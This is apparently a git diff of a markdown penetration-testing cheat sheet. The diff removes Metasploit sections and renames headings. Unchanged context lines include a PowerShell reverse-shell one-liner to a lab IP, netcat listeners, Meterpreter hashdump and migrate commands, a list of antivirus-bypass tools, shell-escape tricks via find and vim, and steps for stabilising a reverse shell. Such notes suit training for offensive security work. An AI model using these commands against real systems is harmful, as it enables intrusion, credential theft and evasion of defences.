@@ -5,11 +5,9 @@
 - [Existing Tools](#existing-tools)
 - [Ping and Port Scanning - Ping Sweep](#ping-and-port-scanning---ping-sweep)
 - [Shells](#shells)
-  - [Metasploit](#metasploit)
-  - [MSFvenom](#msfvenom)
+  - [Payloas with MSFvenom](#payloas-with-msfvenom)
   - [Bypass AV](#bypass-av)
-  - [Meterpreter](#meterpreter)
-  - [Metasploit with database](#metasploit-with-database)
+  - [Shell Meterpreter](#shell-meterpreter)
   - [Stabilizing - spawn shell](#stabilizing---spawn-shell)
   - [Webshells](#webshells)
 - [PWNCAT-CS](#pwncat-cs)
@@ -290,39 +288,8 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
   - nc -nlvp PORT ==> TCP listener
   - nc -ulvnp PORT ==> UDP listener
 
-### Metasploit
-- [Community vs Pro](https://www.rapid7.com/products/metasploit/download/editions/) 
-- [Exploits](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits)
-  - paste: /usr/share/metasploit-framework/modules/exploits
-- Load Module
-  - Find module in searchsploit
-  - Copy module to same folder structure but in *.msf4/module/*
-  - in msfconsole run *reload_all*
 
-```
-# Find module in searchsploit
-searchsploit module_name
-
-# Create a similar folder as module in the msf path + 
-```
-- use exploit/multi/handler
-  - post/multi = post exploitation (generic)
-
-- search
-  - platform:
-  - type:
-  - author:
-  - app:
-  - name
-- show options
-- setg => set global valules
-- unsetg => unset global values
-- background => putting a session in backgrou
-- sessions => display sessions
-- Direct execution
-  - msf -q -x "use exploit/path/to; set payload path/to/payload; set optionsName Name; exploit""
-
-### MSFvenom
+### Payloas with MSFvenom
 - List payloads
   - msfvenom -l payloads | encoders | nos | platforms | formats | all
   - -p payload --list-options
@@ -365,7 +332,7 @@ searchsploit module_name
 |                 [Nishang](https://github.com/samratashok/nishang)                  |
 |                 [Darkarmour](https://github.com/bats3c/darkarmour)                 |
 
-### Meterpreter
+### Shell Meterpreter
 - sysinfo
 - getpid
 - hashdump (migrate to process first)
@@ -373,24 +340,6 @@ searchsploit module_name
 - getpriv
 - migrate PID [try and error, migrating to existing process] + check hashdump
 - search
-
-### Metasploit with database
-- Basic usage
-  - use handler/multi
-  - set payload
-
-1. service postgresql start
-2. service metasploit start
-3. update-rc.d postgresql enable *for performance*
-4. update-rc.d metasploit enable *for performance*
-   1. sudo apt install qemu-kvm libvirt-daemon-system
-5. db_rebuild_cache [in msf console] *for performance*
-
-- db_command ==> db_status, db_nmap etc
-
-- workspace -a (add)
-- workspace -d (delete)
-- workspace name (move to name)
 
 ### Stabilizing - spawn shell
 - Spawn shells
@@ -421,7 +370,7 @@ find . -exec /bin/sh \; -quit
 # Vim
 vim -c ':!/bin/sh'
 ```
-   
+
 - export TERM=xterm = commands like clear
 - ctr + z = back to our shel
 - stty raw -echo; fg = back to reverse shell
